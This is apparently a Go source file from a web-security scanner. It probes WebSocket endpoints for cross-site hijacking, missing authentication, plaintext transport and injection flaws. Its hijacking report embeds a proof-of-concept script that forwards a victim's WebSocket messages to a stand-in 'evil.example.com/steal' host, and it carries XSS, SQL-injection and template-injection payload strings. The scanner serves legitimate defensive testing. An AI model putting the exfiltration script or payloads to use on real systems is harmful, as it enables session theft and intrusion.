package probers

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/sha1" //nolint:gosec // SHA1 required by WebSocket RFC 6455
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// WebSocketProber tests WebSocket endpoints for security vulnerabilities.
type WebSocketProber struct{}

func (p *WebSocketProber) Name() string { return "websocket" }

func (p *WebSocketProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	wsEndpoints := p.discoverEndpoints(cfg, endpoints)
	if len(wsEndpoints) == 0 {
		return findings
	}

	for _, ep := range wsEndpoints {
		select {
		case <-ctx.Done():
			return findings
		default:
		}
		findings = append(findings, p.testCSWSH(cfg, ep)...)
		findings = append(findings, p.testMissingAuth(cfg, ep)...)
		findings = append(findings, p.testPlaintextWS(ep)...)
		findings = append(findings, p.testMessageInjection(cfg, ep)...)
	}

	return findings
}

// discoverEndpoints finds WebSocket endpoints from common paths and upgrade responses.
func (p *WebSocketProber) discoverEndpoints(cfg *ProberConfig, endpoints []types.Endpoint) []string {
	var found []string
	seen := make(map[string]bool)

	commonPaths := []string{
		"/ws",
		"/websocket",
		"/socket",
		"/socket.io/",
		"/cable",
		"/hub",
		"/signalr",
		"/sockjs",
		"/api/ws",
		"/api/websocket",
		"/live",
		"/realtime",
		"/events",
		"/stream",
	}

	for _, path := range commonPaths {
		u := cfg.BaseURL + path
		if seen[u] {
			continue
		}
		// Check if the path responds with 101 Switching Protocols or 400 (WS expected)
		if p.isWebSocketEndpoint(cfg, u) {
			found = append(found, u)
			seen[u] = true
		}
	}

	// Check discovered endpoints for WebSocket upgrades
	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}
		u := strings.Split(ep.URL, "?")[0]
		if seen[u] {
			continue
		}
		// Check response headers or URL patterns
		if upgrade, ok := ep.ResponseHeaders["Upgrade"]; ok && strings.EqualFold(upgrade, "websocket") {
			found = append(found, u)
			seen[u] = true
			continue
		}
		lowerU := strings.ToLower(u)
		if strings.Contains(lowerU, "ws") || strings.Contains(lowerU, "socket") ||
			strings.Contains(lowerU, "cable") || strings.Contains(lowerU, "hub") {
			if p.isWebSocketEndpoint(cfg, u) {
				found = append(found, u)
				seen[u] = true
			}
		}
	}

	return found
}

// isWebSocketEndpoint checks if an HTTP URL responds to WebSocket upgrade attempts.
func (p *WebSocketProber) isWebSocketEndpoint(cfg *ProberConfig, httpURL string) bool {
	conn, _, err := p.wsDialRaw(httpURL, cfg.BaseURL, "")
	if err != nil {
		// 400 Bad Request can indicate a WS endpoint that rejected non-WS traffic
		status, _, _, e2 := cfg.DoRequest("GET", httpURL, nil, map[string]string{
			"Upgrade":    "websocket",
			"Connection": "Upgrade",
		})
		if e2 == nil && (status == 400 || status == 426) {
			return true
		}
		return false
	}
	conn.Close()
	return true
}

// wsKey generates a random 16-byte base64 Sec-WebSocket-Key.
func wsKey() string {
	b := make([]byte, 16)
	rand.Read(b) //nolint:errcheck
	return base64.StdEncoding.EncodeToString(b)
}

// wsAccept computes the expected Sec-WebSocket-Accept value per RFC 6455.
func wsAccept(key string) string {
	const magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
	h := sha1.New() //nolint:gosec
	h.Write([]byte(key + magic))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// wsDialRaw performs a raw WebSocket handshake and returns the raw connection.
// origin: the Origin header value; if empty defaults to httpURL's origin.
// authHeader: optional Authorization header value.
func (p *WebSocketProber) wsDialRaw(httpURL, origin, authHeader string) (net.Conn, string, error) {
	u, err := url.Parse(httpURL)
	if err != nil {
		return nil, "", err
	}

	host := u.Hostname()
	port := u.Port()
	scheme := strings.ToLower(u.Scheme)

	if port == "" {
		switch scheme {
		case "https", "wss":
			port = "443"
		default:
			port = "80"
		}
	}

	conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
	if err != nil {
		return nil, "", err
	}

	key := wsKey()

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	if origin == "" {
		origin = scheme + "://" + host
	}

	req := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: %s\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"Origin: %s\r\n",
		path, host+":"+port, key, origin,
	)
	if authHeader != "" {
		req += "Authorization: " + authHeader + "\r\n"
	}
	req += "\r\n"

	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, "", err
	}

	// Read and parse HTTP response
	reader := bufio.NewReader(conn)
	resp, err := http.ReadResponse(reader, nil)
	if err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("read response: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSwitchingProtocols {
		conn.Close()
		return nil, "", fmt.Errorf("unexpected status %d", resp.StatusCode)
	}

	// Validate Sec-WebSocket-Accept
	expectedAccept := wsAccept(key)
	gotAccept := resp.Header.Get("Sec-Websocket-Accept")
	if gotAccept == "" {
		gotAccept = resp.Header.Get("Sec-WebSocket-Accept")
	}
	if gotAccept != expectedAccept {
		conn.Close()
		return nil, "", fmt.Errorf("invalid accept header: got %q want %q", gotAccept, expectedAccept)
	}

	conn.SetDeadline(time.Time{}) //nolint:errcheck
	return conn, key, nil
}

// wsSendText sends a masked WebSocket text frame.
func wsSendText(conn net.Conn, message string) error {
	payload := []byte(message)
	n := len(payload)

	// Generate 4-byte masking key
	maskKey := make([]byte, 4)
	rand.Read(maskKey) //nolint:errcheck

	// Mask the payload
	masked := make([]byte, n)
	for i, b := range payload {
		masked[i] = b ^ maskKey[i%4]
	}

	// Build frame header
	header := []byte{0x81} // FIN=1, opcode=1 (text)
	switch {
	case n < 126:
		header = append(header, byte(n|0x80)) // MASK=1
	case n < 65536:
		header = append(header, 0xFE) // 126 | MASK
		lenBytes := make([]byte, 2)
		binary.BigEndian.PutUint16(lenBytes, uint16(n))
		header = append(header, lenBytes...)
	default:
		header = append(header, 0xFF) // 127 | MASK
		lenBytes := make([]byte, 8)
		binary.BigEndian.PutUint64(lenBytes, uint64(n))
		header = append(header, lenBytes...)
	}

	header = append(header, maskKey...)
	header = append(header, masked...)

	conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
	_, err := conn.Write(header)
	return err
}

// wsReadFrame reads a single WebSocket frame and returns the unmasked payload text.
func wsReadFrame(conn net.Conn) (string, error) {
	conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
	reader := bufio.NewReader(conn)

	b0, err := reader.ReadByte()
	if err != nil {
		return "", err
	}
	b1, err := reader.ReadByte()
	if err != nil {
		return "", err
	}

	masked := b1&0x80 != 0
	payloadLen := int(b1 & 0x7F)

	switch payloadLen {
	case 126:
		buf := make([]byte, 2)
		if _, err := reader.Read(buf); err != nil {
			return "", err
		}
		payloadLen = int(binary.BigEndian.Uint16(buf))
	case 127:
		buf := make([]byte, 8)
		if _, err := reader.Read(buf); err != nil {
			return "", err
		}
		payloadLen = int(binary.BigEndian.Uint64(buf))
	}

	var maskKey []byte
	if masked {
		maskKey = make([]byte, 4)
		if _, err := reader.Read(maskKey); err != nil {
			return "", err
		}
	}

	if payloadLen > 64*1024 {
		payloadLen = 64 * 1024
	}
	payload := make([]byte, payloadLen)
	if _, err := reader.Read(payload); err != nil {
		return "", err
	}

	if masked {
		for i, b := range payload {
			payload[i] = b ^ maskKey[i%4]
		}
	}

	_ = b0 // opcode is in b0 & 0x0F — not needed for content check
	return string(payload), nil
}

// testCSWSH tests for Cross-Site WebSocket Hijacking by connecting with a
// foreign Origin header and checking if the handshake succeeds.
func (p *WebSocketProber) testCSWSH(cfg *ProberConfig, endpoint string) []types.Finding {
	var findings []types.Finding

	evilOrigin := "https://evil.example.com"
	conn, _, err := p.wsDialRaw(endpoint, evilOrigin, "")
	if err != nil {
		return findings // Upgrade rejected — origin validation may be in place
	}
	conn.Close()

	// Upgrade succeeded with foreign origin — CSWSH is possible
	poc := fmt.Sprintf(`# Cross-Site WebSocket Hijacking PoC:
# Host this HTML on evil.example.com to steal victim's WS session:
<script>
var ws = new WebSocket('%s');
ws.onopen = function() {
  ws.send(JSON.stringify({type: "subscribe", channel: "user"}));
};
ws.onmessage = function(e) {
  fetch('https://evil.example.com/steal?d=' + encodeURIComponent(e.data));
};
</script>`, strings.Replace(endpoint, "http://", "ws://", 1))

	findings = append(findings, MakeFinding(
		"Cross-Site WebSocket Hijacking (CSWSH)",
		"High",
		fmt.Sprintf("WebSocket endpoint %s accepted a connection from a foreign Origin (%s). An attacker can host a malicious page that connects to this endpoint using the victim's browser cookies, stealing session data or performing actions on their behalf.", endpoint, evilOrigin),
		extractPath(endpoint),
		"GET",
		"CWE-346",
		poc,
		fmt.Sprintf("WebSocket handshake accepted from Origin: %s — no Origin validation enforced", evilOrigin),
		"websocket",
		0,
	))

	return findings
}

// testMissingAuth checks if the WebSocket endpoint can be connected without
// any authentication cookies or tokens.
func (p *WebSocketProber) testMissingAuth(cfg *ProberConfig, endpoint string) []types.Finding {
	var findings []types.Finding

	// Connect with no auth (no cookies injected by cfg.AuthSession)
	conn, _, err := p.wsDialRaw(endpoint, cfg.BaseURL, "")
	if err != nil {
		return findings
	}

	// Try to receive a message or send a probe
	wsSendText(conn, `{"type":"subscribe","channel":"user_updates"}`) //nolint:errcheck
	msg, readErr := wsReadFrame(conn)
	conn.Close()

	if readErr != nil && msg == "" {
		// Connected but got nothing — still a finding if auth session is set
		if cfg.AuthSession == nil {
			return findings // No auth configured, so nothing to compare against
		}
	}

	// If we got actual data back without auth, that's a problem
	lowerMsg := strings.ToLower(msg)
	sensitive := strings.Contains(lowerMsg, "user") ||
		strings.Contains(lowerMsg, "token") ||
		strings.Contains(lowerMsg, "auth") ||
		strings.Contains(lowerMsg, "id") ||
		strings.Contains(lowerMsg, "email")

	if !sensitive && readErr != nil {
		// Just report that we could connect without auth
		findings = append(findings, MakeFinding(
			"WebSocket Missing Authentication",
			"Medium",
			fmt.Sprintf("WebSocket endpoint %s can be connected without authentication credentials. Depending on functionality, this may allow unauthenticated access to real-time data streams.", endpoint),
			extractPath(endpoint),
			"GET",
			"CWE-306",
			fmt.Sprintf("# Connect without credentials:\nwebsocat '%s'", strings.Replace(endpoint, "http://", "ws://", 1)),
			"WebSocket handshake succeeded with no auth cookies or tokens",
			"websocket",
			0,
		))
		return findings
	}

	if sensitive && msg != "" {
		findings = append(findings, MakeFinding(
			"WebSocket Missing Authentication — Sensitive Data Leaked",
			"High",
			fmt.Sprintf("WebSocket endpoint %s accepted connection without auth and returned potentially sensitive data. An unauthenticated attacker can subscribe to real-time events.", endpoint),
			extractPath(endpoint),
			"GET",
			"CWE-306",
			fmt.Sprintf("# Connect without credentials and receive data:\nwebsocat '%s'", strings.Replace(endpoint, "http://", "ws://", 1)),
			fmt.Sprintf("Unauthenticated WS response:\n%s", truncate(msg, 400)),
			"websocket",
			0,
		))
	}

	return findings
}

// testPlaintextWS detects endpoints using unencrypted ws:// instead of wss://.
func (p *WebSocketProber) testPlaintextWS(endpoint string) []types.Finding {
	var findings []types.Finding

	lower := strings.ToLower(endpoint)
	if strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "ws://") {
		findings = append(findings, MakeFinding(
			"WebSocket Uses Plaintext (ws:// not wss://)",
			"Medium",
			fmt.Sprintf("WebSocket endpoint %s uses an unencrypted connection. Data transmitted (including tokens and messages) is visible to network-level attackers.", endpoint),
			extractPath(endpoint),
			"GET",
			"CWE-319",
			"# Use wss:// instead of ws://",
			fmt.Sprintf("Endpoint %s uses plaintext WebSocket transport", endpoint),
			"websocket",
			0,
		))
	}

	return findings
}

// testMessageInjection sends XSS and SQLi payloads via WebSocket and checks if
// the server echoes them back (indicating lack of output encoding).
func (p *WebSocketProber) testMessageInjection(cfg *ProberConfig, endpoint string) []types.Finding {
	var findings []types.Finding

	injectionPayloads := []struct {
		msg      string
		desc     string
		cwe      string
		severity string
		check    func(response string) bool
	}{
		{
			`{"message":"<script>alert(1)</script>"}`,
			"XSS via WebSocket message",
			"CWE-79",
			"High",
			func(r string) bool {
				return strings.Contains(r, "<script>alert(1)</script>") ||
					strings.Contains(r, "alert(1)")
			},
		},
		{
			`{"message":"' OR '1'='1"}`,
			"SQL injection via WebSocket message",
			"CWE-89",
			"Critical",
			func(r string) bool {
				lower := strings.ToLower(r)
				return strings.Contains(lower, "sql") ||
					strings.Contains(lower, "syntax error") ||
					strings.Contains(lower, "mysql") ||
					strings.Contains(lower, "' OR '1'='1")
			},
		},
		{
			`{"message":"{{7*7}}"}`,
			"Server-Side Template Injection via WebSocket",
			"CWE-94",
			"Critical",
			func(r string) bool {
				return strings.Contains(r, "49")
			},
		},
	}

	for _, payload := range injectionPayloads {
		conn, _, err := p.wsDialRaw(endpoint, cfg.BaseURL, "")
		if err != nil {
			continue
		}

		if err := wsSendText(conn, payload.msg); err != nil {
			conn.Close()
			continue
		}

		response, _ := wsReadFrame(conn)
		conn.Close()

		if response == "" || !payload.check(response) {
			continue
		}

		poc := fmt.Sprintf(`# WebSocket message injection:
# Connect and send malicious message:
websocat '%s' <<< '%s'`,
			strings.Replace(endpoint, "http://", "ws://", 1),
			payload.msg)

		findings = append(findings, MakeFinding(
			fmt.Sprintf("WebSocket Message Injection — %s", payload.desc),
			payload.severity,
			fmt.Sprintf("WebSocket endpoint %s echoed back an unencoded injection payload, indicating lack of input sanitization. %s", endpoint, payload.desc),
			extractPath(endpoint),
			"GET",
			payload.cwe,
			poc,
			fmt.Sprintf("Sent: %s\nReceived: %s", truncate(payload.msg, 200), truncate(response, 300)),
			"websocket",
			0,
		))
		return findings // One injection proof is enough
	}

	return findings
}
